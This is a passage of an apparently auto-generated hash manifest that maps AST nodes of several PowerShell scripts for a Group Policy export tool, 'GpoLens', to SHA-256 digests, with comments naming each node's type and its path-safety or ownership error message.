        "28": "c72b84455d81c5415508d5298f2b10273e5d9046d55998b232cd34608c7607d8",
        # [2/2/1] TryStatementAst: zip
        "29": "8d18993762d867ec3faf801c2bf94f25ac128c4569fe4679a1ba7299c5f5391b",
        # [2/2/1/0] AssignmentStatementAst: zip
        "30": "f8768a5b74b56022584ac5521c8750783a1beb6b888e50fb632bfc20ed0af2ba",
        # [2/2/1/1] IfStatementAst: zip
        "31": "b28b008da44a51dac6c8cae0b3e4ef18cf76fb09a85dbc0a51d690627ab3f6a2",
        # [2/2/1/1/0] PipelineAst: archive
        "32": "839b5db1d922c3141b8f32abdb32263e4d03ccc864b22ebab0a945529855b8d2",
        # [2/2/1/1/0] PipelineAst: Write-Warning
        "33": "723cd4de6b2acd9e9e68b9f041065aaf6edc2afa7aae55e9c31350d004d30e4a",
        # [2/2/1/1/0/0] PipelineAst: archive
        "34": "720bcde2a39b6f18aa3c740f82e3cab39a72f4b65448bfdeaa78c28f06eb3df9",
        # [2/2/1/0] PipelineAst: Write-Warning
        "35": "7e81380e6c93e18840291166409938b13106f006b2327285d2676ae162fd3b14",
        # [2/2/1/0/0] PipelineAst: archive
        "36": "720bcde2a39b6f18aa3c740f82e3cab39a72f4b65448bfdeaa78c28f06eb3df9",
        # [2/2/1/0] IfStatementAst: zip
        "37": "0ebb90584aca5ebd1012d47ded379dbbaa9649a6e9c76a8d81be7d49ed59fd41",
        # [2/2/1/0/0] PipelineAst: zip
        "38": "9daf1fbe7925244c67e74e2096f964cf9d4284d59f85bd4aec668c8e9a29f6e8",
        # [3] FunctionDefinitionAst: Root
        "39": "91c7f5b8e382132b64367751bb7f747aa6080199e0dab3cae6e66e1f4acb4e48",
        # [3/0] AssignmentStatementAst: pending
        "40": "153d0c08f328f0f0efeb9e75afcf30d766f9511f8ac5c82f408081a520afaee0",
        # [3/1] PipelineAst: pending
        "41": "0591e6894cbbb71e79a80047b5273075f212d88e633c25db2b298348ae378208",
        # [3/2] WhileStatementAst: pending
        "42": "4c3af8c1cc5bc4adbfe5ed339134097b9b79e3812e6e780a005a066b12c32b1b",
        # [3/2/0] AssignmentStatementAst: directory
        "43": "53fbd2ab06b31b06f883de4c85e65430b8bdbb0a77892ececd8100c47e524c65",
        # [3/2/1] AssignmentStatementAst: item
        "44": "3b44e8e545dfda31fc8d18341db29d00d1a1fb367fa117560cb573f4636bdf90",
        # [3/2/2] IfStatementAst: item
        "45": "50bf278cc9dd4d0acb8ed50f3fa5b08247fc6796dff7f4167d486beca701d1a8",
        # [3/2/2/0] ThrowStatementAst: Retention refuses a linked export folder or file.
        "46": "40d85a339a857631ee77fed4610a49da6ca0e844f1d3d417bfcc54b20f314e45",
        # [3/2/3] ForEachStatementAst: child
        "47": "fff1cdd39bc641b89a587465ccca7de0345a4f6ac7bd23e8c097d5f7963026de",
        # [3/2/3/0] PipelineAst: Get-ChildItem
        "48": "ba2d1845f164bfe05da9817d13568bfecdc8d7c8eda40f07a70176652a50b991",
        # [3/2/3/0] IfStatementAst: child
        "49": "fe2f04eb28a439afae52a17a37e23522af9575895439d014eea4407b92c9b2a2",
        # [3/2/3/0/0] ThrowStatementAst: Retention refuses a linked export folder or file.
        "50": "40d85a339a857631ee77fed4610a49da6ca0e844f1d3d417bfcc54b20f314e45",
        # [3/2/3/1] IfStatementAst: child
        "51": "66b0e745e843dcb7d98531a4d39592f66cc2d1f2c5eeed84c7d016bf696d5da6",
        # [3/2/3/1/0] PipelineAst: pending
        "52": "636b71b911d6f1b3ad9564962519fa8b9ff440efca558a0a4f8c27503fac2d80",
        # [4] FunctionDefinitionAst: OutputRoot
        "53": "b3844c0dda30d6707a2896c1c08a4f4dbdd7240d43933ab70b771012ad1df902",
        # [4/0] AssignmentStatementAst: marker
        "54": "e3292981c6b71e89c2847fd0ce75883d7f6665ef4c3d1e34d023d5756f3623ca",
        # [4/1] IfStatementAst: Test-Path
        "55": "d8703da59e374ed41009c9fc8839b51c6a57f5273ba237cb08479e3c361da456",
        # [4/1/0] ThrowStatementAst: Collection refuses an output root without an owner marker. Re-
        "56": "38a10cf264b8e15b5077f13b21f8fb012a7d8f7f0cb6231e3daf807f60fbb82e",
        # [4/2] AssignmentStatementAst: bytes
        "57": "83a4786804f8553b704fb1b6505e995060f5ffddc5fbce03ae71e1c4da54243b",
        # [4/3] AssignmentStatementAst: owner
        "58": "c6bb625f8be97f0848ae61e9e7fc0374f40d364cf2977063450f1aabcc49d446",
        # [4/4] IfStatementAst: Equals
        "59": "abc2e6b1c79f8c697755229ef31aea41ce39964135686a32d9b591a845cf5424",
        # [4/4/0] ThrowStatementAst: Collection refuses output root owner '$owner' for task '$TaskN
        "60": "14c94d425ec8a67b0fceea3b4208e2c4e492741a858ce26c12c93ef63470aa60",
        # [5] FunctionDefinitionAst: True
        "61": "f5d23ab6236206f968a133854ea6740719e7d15e2c5adf82fee8496267ea9066",
        # [5/0] AssignmentStatementAst: ErrorActionPreference
        "62": "377020eb96957a66bcf052c8123be641902cb0ebb4315a09718a476a4ca5aa59",
        # [5/1] IfStatementAst: Test-Path
        "63": "04d2a09499f715af18a3e2cfa6acc24215de0529886f84d249d9e795d5f6cca9",
        # [5/1/0] ThrowStatementAst: Collection refuses a linked output root.
        "64": "2bf2c573ae7db28f2f8d032cd9c62cac8f546b7326015dd23c7876065580d259",
        # [5/2] PipelineAst: Assert-GpoLensCollectionOwner
        "65": "1c3571d5925b789164a3740440cc1a79cd1f495bc86e2044fa2ee5252be06888",
        # [5/3] AssignmentStatementAst: lock
        "66": "bb85f64ff18a5115a8e508477e940a521821afdaa500048799f05e756b5fa8ed",
        # [5/4] AssignmentStatementAst: logArgs
        "67": "2dadc7587bd030d57ebaa4a2720b453340a49303c5b74ec2b5aa07453479c10c",
        # [5/5] TryStatementAst: Assert-GpoLensCollectionOwner
        "68": "6fe5a18e2bc6ad9a19705e89c5da5b3d32b489a9fdf8b006d030ea1bbecfbcc7",
        # [5/5/0] PipelineAst: Assert-GpoLensCollectionOwner
        "69": "1c3571d5925b789164a3740440cc1a79cd1f495bc86e2044fa2ee5252be06888",
        # [5/5/1] PipelineAst: Write-GpoLensCollectionLog
        "70": "030a693a15435f93dab972855314175cd750fa6fd959fdc62a77c78258eef5f8",
        # [5/5/2] IfStatementAst: InventoryPath
        "71": "36a3efafc0e15361f07369069398bfe5cf9e276595447004bfd4e40900875e86",
        # [5/5/2/0] AssignmentStatementAst: inventoryBytes
        "72": "fa72e32374ff3b795b28c451fd030e8fa37ae31a6dee3ecfe3a7b751e219381a",
        # [5/5/2/1] AssignmentStatementAst: inventory
        "73": "16068adfc692974178038e53f99bbc5e2e6b5ca032a60dc69c89b84312ec8b1c",
        # [5/5/2/2] IfStatementAst: inventory
        "74": "7bb746a0fc3a8b069cd0990a25d81a065dd78bc383984f2cd3195669bba3b3a2",
        # [5/5/2/2/0] ThrowStatementAst: Authoritative inventory must not be empty.
        "75": "36f49a14ac85750e4e146c96330d2967ba93d8c7b54fe5055c42ee9ead424b06",
        # [5/5/2/3] AssignmentStatementAst: ids
        "76": "5b41cda8609211307a64500d4acef2a1da88e23b7cf1a37c02220ae668dbc672",
        # [5/5/2/4] ForEachStatementAst: entry
        "77": "87f6ddf2f8de97e4d8a262d3dd4633f26dd20a3ce38de31c403a1ee4a6a2aef7",
        # [5/5/2/4/0] PipelineAst: inventory
        "78": "00f612d646b5513c3876de26eebdb545c48daea28297badbae6487cdea8063cf",
        # [5/5/2/4/0] AssignmentStatementAst: id
        "79": "eea2e8fc824a46a51fe536107f94b5ec41ea1ea3dd0aa070ad4f020d5806dfe7",
        # [5/5/2/4/1] IfStatementAst: TryParse
        "80": "e5e0fa0d9a393ab2c24b5c49b070567c8ce3c84c29e5467d42f7082100f7e92c",
        # [5/5/2/4/1/0] ThrowStatementAst: Authoritative inventory entries must have valid GPO GUID
        "81": "eb97526c63ffe43a1e23580feed3bc74149df6acc55aa012e7a81a97cf045095",
        # [5/5/2/4/2] IfStatementAst: ids
        "82": "9159111d18cff84dddcfbef88af3d5a226bddb4919ae4303235d7688bb3fbd54",
        # [5/5/2/4/2/0] ThrowStatementAst: Authoritative inventory contains duplicate GPO IDs.
        "83": "209fb68345f19b314854d29bcc5cd82941b121f4f7077dc1999b27d8e6d5e602",
        # [5/5/3] AssignmentStatementAst: previous
        "84": "91da074a01a91660360cd94649e3a9ff23b2eb1d78832b3fc5455a2faaeebb3d",
        # [5/5/4] PipelineAst: Get-ChildItem
        "85": "f9e0bc037982949f3b06fd34111a52e8e213e02d502d9841747d047246ae8153",
        # [5/5/4/0] AssignmentStatementAst: previous
        "86": "b547ddce8b3c74619e5690f6a911c65d4276b70629e663858edecab0d19f7c3d",
        # [5/5/5] PipelineAst: CollectorPath
        "87": "92af03324a4e5cc247d3b55a90a26d66332f88b9b87df1c5ada6a0061a82c2ea",
        # [5/5/5/0] PipelineAst: Write-GpoLensCollectionLog
        "88": "5d4e6dbd872a0b6af0d2d5388bc32f244cc5302a517c7429286cb7f4c00135ba",
        # [5/5/6] AssignmentStatementAst: created
        "89": "7f09dbb8b9fa1adfe4ebb5b3670aa90a6e4250c126328e14763d7370cd7ea00d",
        # [5/5/6/0] PipelineAst: Get-GpoLensCompletedExports
        "90": "c1479ae012d072837a4a52666c8f9a2bfc8d833e23a3732eebf7ee81ed3d43a5",
        # [5/5/6/0/0] PipelineAst: previous
        "91": "b902734d6cd5ebf6a9bb2631794381262dbee7f6f49a356ad1b1b48130c1a489",
        # [5/5/7] IfStatementAst: created
        "92": "4017a40783d669197334be2f2c27e13df0b8905d5446d1692a51adeab8f3d53e",
        # [5/5/7/0] ThrowStatementAst: Collector must create exactly one new complete ZIP; found $(
        "93": "c677112b769876eaa5bd6ec779b477456306e964e05943f755670f49420adf3a",
        # [5/5/7/0/0] PipelineAst: created
        "94": "a77d960056af1221a0c30a9ef719f37027f4a8c91655fcdf1d319f8780e53e82",
        # [5/5/8] AssignmentStatementAst: newest
        "95": "159d72beceb823717f7b3471350a3b6cd72a65b16d8759823e06d8078124d848",
        # [5/5/9] AssignmentStatementAst: exportDir
        "96": "cdddd18bbdc1d93aabe9487720dff536c10d8fc3e901d15ff2128c7573aee8db",
        # [5/5/10] PipelineAst: Add-Type
        "97": "5bd2c377bb1eb96ee894083e32f481400bdf96f5281d9de456720b9c709f8182",
        # [5/5/11] AssignmentStatementAst: zip
        "98": "c72b84455d81c5415508d5298f2b10273e5d9046d55998b232cd34608c7607d8",
        # [5/5/12] TryStatementAst: zip
        "99": "1defa62e103b0740df3724d066154dc819fff6255bec9bfe16cdbe28992a3451",
        # [5/5/12/0] AssignmentStatementAst: zip
        "100": "eb9f53cf132215feebe45f99a1572058356f4d0188160c9ab4c8367cfad9d407",
        # [5/5/12/1] IfStatementAst: zip
        "101": "81891a905ff336ce5ddbe6f3d6c406b9a4151d72533ee7d1c1de2c54fc180659",
        # [5/5/12/1/0] ThrowStatementAst: New ZIP has no AllGPOs.xml.
        "102": "3eff19cf2b5b7351d75b0e7d76ec4b0a8069f79cc4b4f060d08884547a8387c6",
        # [5/5/12/2] IfStatementAst: InventoryPath
        "103": "034884da4d93efe258beedaa495bef904c38b97fd795c3af568144277f120897",
        # [5/5/12/2/0] PipelineAst: WriteAllBytes
        "104": "243563da5af1c64c1179a764cc223ad8ed3180dcc4be67fb81142f624ab5cc3d",
        # [5/5/12/2/1] AssignmentStatementAst: entry
        "105": "778bda09a78d3f34265360c47f5604f876095a969aa135b691e9dea444d8eaeb",
        # [5/5/12/2/2] IfStatementAst: entry
        "106": "abf7de1e07131cc66f3aa5abee428ceb66c0727d33b6f7bb54495250291a5137",
        # [5/5/12/2/2/0] PipelineAst: entry
        "107": "e41f14d66e9fe6653d14651e42e6d9f6ae31a6e6f5a9e3e8bce920c9310c084a",
        # [5/5/12/2/3] AssignmentStatementAst: entry
        "108": "bdc4ebe5cbd213cd3196480517915d0e51181cf2a68ab7a584f49f62ecb569f6",
        # [5/5/12/2/4] AssignmentStatementAst: stream
        "109": "2215e670f8b6322a9703bf027710002f4afd01373296fbb40aad712508fb04be",
        # [5/5/12/2/5] TryStatementAst: stream
        "110": "771fa5e89e0d9a35735a7b566a52652b50c929581d9c1e80719678d19c9a1f0a",
        # [5/5/12/2/5/0] PipelineAst: stream
        "111": "46db42df5eb34a674e974e2786b0f50085c51bdcdd4fd12a67a0308e68f2f53f",
        # [5/5/12/2/5/0] PipelineAst: stream
        "112": "597ac98e7982037498e149ff472b11c7bb30aebcf2bfe9e165e8792680593ff5",
        # [5/5/12/0] IfStatementAst: zip
        "113": "0ebb90584aca5ebd1012d47ded379dbbaa9649a6e9c76a8d81be7d49ed59fd41",
        # [5/5/12/0/0] PipelineAst: zip
        "114": "9daf1fbe7925244c67e74e2096f964cf9d4284d59f85bd4aec668c8e9a29f6e8",
        # [5/5/12/1] PipelineAst: Remove-Item
        "115": "f5a6744fc8680f468104209af0a0da5b13a977a80217aeec5c17627bd2ddd0cc",
        # [5/5/12/2] ThrowStatementAst:
        "116": "fb22bcbb06523465a10f46a355d1b27c3cb2b0edf0d80341a5a62ec265bcbf7d",
        # [5/5/12/0] IfStatementAst: zip
        "117": "0ebb90584aca5ebd1012d47ded379dbbaa9649a6e9c76a8d81be7d49ed59fd41",
        # [5/5/12/0/0] PipelineAst: zip
        "118": "9daf1fbe7925244c67e74e2096f964cf9d4284d59f85bd4aec668c8e9a29f6e8",
        # [5/5/13] IfStatementAst: CopyTo
        "119": "d635e4f7452f4d7e55e23dbd1067a52af4846d5e6f1c88ba252a961360c4cdf0",
        # [5/5/13/0] PipelineAst: New-Item
        "120": "a28dfdcb4719e166946569cbd4bdd9f04502b7d9371541feb447e258d5b712a8",
        # [5/5/13/1] AssignmentStatementAst: delivery
        "121": "769125ac2a8de39a889d6d165d162ff4c4dabe4d802ac2cb3ec1cbae670dbba8",
        # [5/5/13/2] AssignmentStatementAst: partial
        "122": "cdddb4921eadabc15b30b1bd85eff1909f452ae44c3f22422b5ad47684219c0a",
        # [5/5/13/2/0] PipelineAst: NewGuid
        "123": "2a3e02d05335c49acf058c745d3dca8a92e13ddac9e7f2785493b3534fd43e18",
        # [5/5/13/3] TryStatementAst: Copy-Item
        "124": "de097165e7f73a553a92be75b66ac0f87d17eeba947b243fa7f09088444e48f5",
        # [5/5/13/3/0] PipelineAst: Copy-Item
        "125": "c4645261851172f39477d4df16e5113242c08fd5fb060f16abb182a1bd08f876",
        # [5/5/13/3/1] PipelineAst: Move-Item
        "126": "314f4fe90cc725361689e9ecc73e27daf8f8b7f3e29463ec3f2b0136ae13b655",
        # [5/5/13/3/0] IfStatementAst: Test-Path
        "127": "5477d54fcd1796e86a63ff782239329f9fc855b6590bad235ec823e314a79ad2",
        # [5/5/13/3/0/0] PipelineAst: Remove-Item
        "128": "9e6cbbd8feaadc7c08cf8fe06ec8bca01996508cc83eb86a92a81378f93bc77b",
        # [5/5/13/4] PipelineAst: Write-GpoLensCollectionLog
        "129": "54864fd907f145bb3fcabc9ea5666ae0a4935905bbe4e7b0a4f281b073c5d8dd",
        # [5/5/14] PipelineAst: Assert-GpoLensCollectionOwner
        "130": "1c3571d5925b789164a3740440cc1a79cd1f495bc86e2044fa2ee5252be06888",
        # [5/5/15] AssignmentStatementAst: producerPrefix
        "131": "aed90e845c9063c304ecdf411d6ba7d9faf8beb9722876506a3df13cd71502db",
        # [5/5/16] AssignmentStatementAst: expired
        "132": "fd004eddd4071ae6c8bd6ef0bd4a6d8b1641d0b91ceb7dabdd1d7400b50c16a0",
        # [5/5/16/0] PipelineAst: Get-GpoLensCompletedExports
        "133": "726afd286a7bca28905bec19237ef0149192c816248946bd3a51b7d5c1ca9e48",
        # [5/5/16/0/0] PipelineAst: Equals
        "134": "0bdb8022a748fa596828c3abbd540f684e6b2fb672d187c09ea77707c62a50aa",
        # [5/5/17] ForEachStatementAst: archive
        "135": "fe9c22c681502908909bcc8a9f48d8f02af9cd1014141b50b1a33016f212156d",
        # [5/5/17/0] AssignmentStatementAst: folder
        "136": "bff2bc63146184e1b7b1dbd86efeb5ba2d152039fed0664455eef0710de2a20f",
        # [5/5/17/1] PipelineAst: Assert-GpoLensRegularTree
        "137": "c562bec432c3a984f842c4b87cbe37aa4382eb74a56a806dc99ce1be0c02a822",
        # [5/5/17/2] PipelineAst: Remove-Item
        "138": "54cbd0f3e1596be2aa8ec34c4c617dc1889b458c7de13d5ef5ab8a3622b0caa9",
        # [5/5/17/3] PipelineAst: Remove-Item
        "139": "b62ddd857d29cc6ded84c2831261264f762b319815b0aead9833e18c59df52db",
        # [5/5/18] PipelineAst: Write-GpoLensCollectionLog
        "140": "b00c78e28cc1ccb781fa2351dcfa17557e6b2fdcc6d6d3fef331518fa16b155b",
        # [5/5/18/0] PipelineAst: newest
        "141": "7d0cff6dddea3a96eb2c0dfca8bf18f77659423290454e0a2f248fa77491bbac",
        # [5/5/19] PipelineAst: Write-Host
        "142": "cccbf2c95d70f6b16ff87acd2c538a05045db86ba4f85f0769b7175e8c9d4e46",
        # [5/5/19/0] PipelineAst: newest
        "143": "ecfe4daa0c60da4a5190fe0daccb8edd580b12ffab26f9d9ab2ad29c62149437",
        # [5/5/0] AssignmentStatementAst: failure
        "144": "2886bcec21c751192b29725922f5c54fd3003c9732621db388de8b4f2c65d00e",
        # [5/5/1] TryStatementAst: Write-GpoLensCollectionLog
        "145": "219ea9d89e7678a46188cf415e46a99611354e4f0b4a449addcf266c4bab7198",
        # [5/5/1/0] PipelineAst: Write-GpoLensCollectionLog
        "146": "5673bdd8faa862d2528cf5eee576c3ae0336c1d6be190537eb375cde6735be82",
        # [5/5/1/0/0] PipelineAst: failure
        "147": "ddc6d3c4193e8d5348c5b273df973ba599e2b6568b5656608a78d2e2429b2356",
        # [5/5/1/0] PipelineAst: Write-Warning
        "148": "a2072edf6cf8b790503ae35773265aa21e50ceb65ba20613a490da2df9145ba1",
        # [5/5/2] ThrowStatementAst: failure
        "149": "dfd2f71f1d6abb6d9d1640c00dd1d546fe681f5e99f4cf5e33c884b1a8772e82",
        # [5/5/0] PipelineAst: lock
        "150": "237f27ee448c8aec9bd28dc2a61ba2427f9ea32e81ff8052e0db641c5d66898a",
        # [6] IfStatementAst: MyInvocation
        "151": "e380f91301ce8a1acc2c1b51d1c625ecef58aebe934b20ced814b4db9ba83369",
        # [6/0] TryStatementAst: OutputRoot
        "152": "a943a430814d1033c30ea3d7af69d5360ec67a67a1a99289a3f707867c9fc620",
        # [6/0/0] IfStatementAst: OutputRoot
        "153": "6722b8084c0073c7e707da88bc97f424424bef1fdf38c2a04660ac26df157c0f",
        # [6/0/0/0] ThrowStatementAst: -OutputRoot is required.
        "154": "3fe35a07bab99d0904ef980a24546eee1bad816ca59f8fbc3175c09d9fc06df9",
        # [6/0/1] PipelineAst: Invoke-GpoLensCollection
        "155": "13ca3473d13d6053d5a4be0a894ad1de53df7f1de2d6475bbd2fc773ce80afdc",
        # [6/0/0] PipelineAst: Write-Error
        "156": "b734d23332fd8e5d3db8f39ee37766405e02d03ca09ebe9b4e4b373e329635c5",
        # [6/0/0/0] PipelineAst: _
        "157": "589780c5d638ed38167c3c2c437335771db3e1128cfbcc5a8a827584a6a29e16",
        # [6/0/1] ExitStatementAst: Int32:1
        "158": "0e81a12e02b06c7be2a38a48bb887570e5e69da38dc3ce4526eb335023d4078a",
    },
    "GpoLensCollectionMarker.ps1": {
        # [0] FunctionDefinitionAst: Marker
        "0": "eb5553aaed4f21cf4218d8590d3d06f39390216d89844f50b1cb8dd7d8833a0e",
        # [0/0] IfStatementAst: Get-Item
        "1": "2e97580fe29628c5aef7ae9ead79e80f5674e64bc751b43e4b9fc720dc608410",
        # [0/0/0] ThrowStatementAst: Collection refuses a linked owner marker.
        "2": "2b26fb939b91ae712db0bf563ab9a2f4499273faa4e9dd78fa9a2dcb9f4b0346",
        # [0/1] AssignmentStatementAst: stream
        "3": "7b4f0231b27b4a8e5c85420f15a6f71b89c109b9d3d65d54fb47ab0d6366111d",
        # [0/2] TryStatementAst: OSVersion
        "4": "6ae05c1185b02766d3d78d18baf85c0ca1ce6b8b07642a98b183e8e391ad06a5",
        # [0/2/0] IfStatementAst: OSVersion
        "5": "d72aa7f9f806bced31084983e219e6f94bd989d6bbc0b740586c6322f52f28ca",
        # [0/2/0/0] IfStatementAst: GpoLens.MarkerFileInfo
        "6": "73a8a708742748e181ad5c9b1800b821272af8c1396c3ead9718664c03b74e8e",
        # [0/2/0/0/0] PipelineAst: Add-Type
        "7": "857d68b604b36a5f9e5d74b22543dff66d52e9a52418ca01ee3df1517e5f9d16",
        # [0/2/0/1] AssignmentStatementAst: links
        "8": "b8688aeb544fdab1ecf7f8bd429c4f58a78a6b5c4fcec5fbfdfd639777fd922b",
        # [0/2/0/0] AssignmentStatementAst: fd
        "9": "75c892dc32b6fa4d8c68d9725f43ab8cb873e606d49d42c1bf2c2faaa6c226e6",
        # [0/2/0/1] AssignmentStatementAst: opened
        "10": "932ff0beb19986e60ef5378a59974c9c9eb4d7b258cc3d4a6119e22500451941",
        # [0/2/0/2] IfStatementAst: Test-Path
        "11": "f304236be83dbd4760aa94668f931cf373f912c42d340bd2b9bc3d15dad6f1ee",
        # [0/2/0/2/0] ThrowStatementAst: Cannot verify owner marker link count.
        "12": "57edd33c9953412be8041e2fe03ad061ae3657c8bd635c264f7c66925408c41a",
        # [0/2/0/3] AssignmentStatementAst: count
        "13": "3db986c85f3b2990e70d19c7c6b4eb5d03f5e0d8b61e55ac817534231b5956da",
        # [0/2/0/4] AssignmentStatementAst: links
        "14": "c6050755981cca2f46c157110ddce960935e679d8cc487d83680cd453fdb9611",
        # [0/2/0/5] IfStatementAst: LASTEXITCODE
        "15": "88e2f0e2edd7862d00f8650c3facc1fe9d3125a6d735a47926e192ce1523587a",
        # [0/2/0/5/0] ThrowStatementAst: Cannot verify owner marker link count.
        "16": "57edd33c9953412be8041e2fe03ad061ae3657c8bd635c264f7c66925408c41a",
        # [0/2/1] IfStatementAst: links
        "17": "9559236133d4cf95232520cc1b05a97f31a2c14d17b7b0ac8c8e95ca7b0e1847",
        # [0/2/1/0] ThrowStatementAst: Collection refuses a linked owner marker.
        "18": "2b26fb939b91ae712db0bf563ab9a2f4499273faa4e9dd78fa9a2dcb9f4b0346",
        # [0/2/2] AssignmentStatementAst: bytes
        "19": "042152a58f2823127b37295dfc0c8ef2e4367992464cdce46bd3f2ac13bbd731",
        # [0/2/3] TryStatementAst: stream
        "20": "12a5e854510e681990093716173f5c2b28eff782fb85b155924eecf8a0cd6590",
        # [0/2/3/0] PipelineAst: stream
        "21": "5119dc07bec589677d473d2514722073c89d80da1186f063f62ceb316d09ea3d",
        # [0/2/3/1] ReturnStatementAst: bytes
        "22": "a85a52ad95fece356ae8ea7bfd52cd10960d40b5af7b5db7302069ccd03e49ef",
        # [0/2/3/0] PipelineAst: bytes
        "23": "ed263639707a9bb7d4827d0ad3025a2e7303662412e4152356b8b039ae44076f",
        # [0/2/0] PipelineAst: stream
        "24": "597ac98e7982037498e149ff472b11c7bb30aebcf2bfe9e165e8792680593ff5",
        # [1] FunctionDefinitionAst: OutputRoot
        "25": "7686d37ce4d98bb3647c8eaeac281dedf29ddf4f29e50571df6fc0b9f5ea956b",
        # [1/0] AssignmentStatementAst: root
        "26": "b5a205b64ad3faa4484f99dee68df4ca6789d7769f09fd1c1962e79541625699",
        # [1/1] IfStatementAst: root
        "27": "d990e9ecb0e53f0108a06260b544e0cb35748badfebf66a34207172e75def9f9",
        # [1/1/0] ThrowStatementAst: Registration refuses a linked output root.
        "28": "877b43a1c542f18680203b1ff96f83ebdf3efa4218f61f868bb65bf6291ce88b",
        # [1/2] AssignmentStatementAst: marker
        "29": "397285cf8657634a69b86bfe054598021673cff913314e184f647cb8985cf971",
        # [1/3] PipelineAst: Delete
        "30": "9bf2039b5f18b81c8d5031bd9d01916ce8bb1bf740e00cbd0aedf8eeba017041",
        # [1/4] AssignmentStatementAst: stream
        "31": "03b9fc1e2e796448c8f55154837786eac396df031010889bae241f663816066a",
        # [1/5] TryStatementAst: stream
        "32": "29f7cf64cfd3618bb1117ef88fc004c660dd818488084c5f7e9bf2bf803e728f",
        # [1/5/0] PipelineAst: stream
        "33": "a4be56093069eebc3ca329b62283613eb0637e820b3b3b00bed0a17012b2db99",
        # [1/5/0] PipelineAst: stream
        "34": "597ac98e7982037498e149ff472b11c7bb30aebcf2bfe9e165e8792680593ff5",
    },
    "Register-GpoLensCollection.ps1": {
        # [0] PipelineAst: _
        "0": "12e196d96bd4b18520fb1f2cf31e7e8e872b58609b56b002784ef570ab52a565",
        # [0] PipelineAst: Join-Path
        "1": "8923ec8dd07ac8c28f1590734bb6e20f988da94cf372d9e32428fc72f39ab612",
        # [1] FunctionDefinitionAst: Value
        "2": "c4456d32469d7186c9cd20b7a249d9ee6fd441b865ac5f759cd545294b5fb8a7",
        # [1/0] IfStatementAst: Value
        "3": "cadaed0b420caf33d5c2362f0abfa2bf578432ef385a7f50b1850ab1c2b57009",
        # [1/0/0] ThrowStatementAst: Task paths cannot contain quotes or newlines.
        "4": "65fa82df3be0ca839bdfe049131337c87947b48fb24f7f64dc5276b811eee58d",
        # [1/1] ReturnStatementAst: "
        "5": "fca2cfe65a03bcaaa442003507019acf08194b5fabae51df4c517bab6da97886",
        # [2] FunctionDefinitionAst: Value
        "6": "d272b8d1a6959fbae968f92b7ee2563138086c5c47963ad676e6cd62be2b11c3",
        # [2/0] IfStatementAst: Value
        "7": "79c7096c160e4d16398f1e7bebe65aada25a7fb797dc07dff4619e9f4e32f3ef",
        # [2/0/0] ReturnStatementAst: Value
        "8": "8911f81b0e1cb065d235f745849c2991175c63e7cb7d92f06f972ce4f9d16e28",
        # [2/1] ReturnStatementAst: GetFullPath
        "9": "ba4efc011ccb6484f1bb77ad922e4a5e2a23a0b71ea338e86be3a42820f70f9b",
        # [3] FunctionDefinitionAst: OutputRoot
        "10": "48cd57211526e23fcc5c67efb3f2749a58a4e71730f3cba4d879097f5bd2bd28",
        # [3/0] IfStatementAst: Test-Path
        "11": "f79af221de6ed9d861eca4761cc900a2450fee36b0f428231ff6f4704d3e6f93",
        # [3/0/0] ThrowStatementAst: Registration refuses a linked output root.
        "12": "877b43a1c542f18680203b1ff96f83ebdf3efa4218f61f868bb65bf6291ce88b",
        # [3/1] PipelineAst: New-Item
        "13": "fee4fd197015251a4b500d7bc1df8bfad6e1ed9578a0ebe73eb71fbb9aa8a9aa",
        # [3/2] AssignmentStatementAst: lock
        "14": "bb85f64ff18a5115a8e508477e940a521821afdaa500048799f05e756b5fa8ed",
        # [3/3] TryStatementAst: marker
        "15": "eebec80ce7fbcd3cf1e8181c378ceccc9182d86eea478c6207e071fa1305e21d",
        # [3/3/0] AssignmentStatementAst: marker
        "16": "e3292981c6b71e89c2847fd0ce75883d7f6665ef4c3d1e34d023d5756f3623ca",
        # [3/3/1] AssignmentStatementAst: previousBytes
        "17": "333757495f3cb97323be4294c19696df29f1525354f62490e9b7d16150c53f13",
        # [3/3/2] IfStatementAst: Test-Path
        "18": "2bf24a7463098177f6468e2614c41ed23e00b12044ba93453ff586502dbe63fc",
        # [3/3/2/0] AssignmentStatementAst: previousBytes
        "19": "a89250fde1e233ebafbdea287c5e968e108004af3b26c31ec7506779dada745a",
        # [3/3/2/1] AssignmentStatementAst: owner
        "20": "402f994efae9a087145febc2b27f7588988e7088c1f3aeacb3f6bf10189f7cf6",
        # [3/3/2/2] IfStatementAst: Equals
        "21": "9733428d53c513f2cd7f7a685b9d8875466279650ef923aa956676e947d5c1ff",
        # [3/3/2/2/0] IfStatementAst: Force
        "22": "5200ed712dfbbb76f6d89c18afec67c73a37a4c4e619603bfd8f1b1294b7d34d",
        # [3/3/2/2/0/0] ThrowStatementAst: Output root owner is '$owner', not '$TaskName'. Use a se
        "23": "d4c23a17ca893c704b817f38e21319f77db1903001578f6212755556a4f530ff",
        # [3/3/2/2/1] PipelineAst: Write-Warning
        "24": "edf7c166bc90fff3d0ddce8d453340c515de50f5cae7f4f6a612164a0483cbd2",
        # [3/3/3] TryStatementAst: Write-GpoLensOwnerMarkerBytes
        "25": "f9a6ef2475bd92220c5bbe1ec41976418ef65a96afb235cea961794064cfc0df",
        # [3/3/3/0] PipelineAst: Write-GpoLensOwnerMarkerBytes
        "26": "b15dc0616eaa9d1d9a50b2ef770923fbe397b2774731cb6bb19789760d2702aa",
        # [3/3/3/1] PipelineAst: RegisterTask
        "27": "2278e3e4488d28ddecfafda9d1ff30d6a07d0d2e8063576cf9986290fc1a6815",
        # [3/3/3/0] IfStatementAst: null
        "28": "5ef8a4949c3e04bcaaf3e2d67843cf1e0f3e006ed40fd30932c56a3d2304d401",
        # [3/3/3/0/0] PipelineAst: Write-GpoLensOwnerMarkerBytes
        "29": "e652847636d414ba8ff4aa4a4f8f11afb590537d3098c8bda177038ceabf7f5a",
        # [3/3/3/0/0] PipelineAst: Delete
        "30": "9bf2039b5f18b81c8d5031bd9d01916ce8bb1bf740e00cbd0aedf8eeba017041",
        # [3/3/3/1] ThrowStatementAst:
        "31": "fb22bcbb06523465a10f46a355d1b27c3cb2b0edf0d80341a5a62ec265bcbf7d",
        # [3/3/0] PipelineAst: lock
        "32": "237f27ee448c8aec9bd28dc2a61ba2427f9ea32e81ff8052e0db641c5d66898a",
        # [4] IfStatementAst: MyInvocation
        "33": "aa91b002c949315da422c4187c26fc9229ba852255deb91138483ae0f06db3ce",
        # [4/0] AssignmentStatementAst: ErrorActionPreference
        "34": "377020eb96957a66bcf052c8123be641902cb0ebb4315a09718a476a4ca5aa59",
        # [4/1] IfStatementAst: Unregister
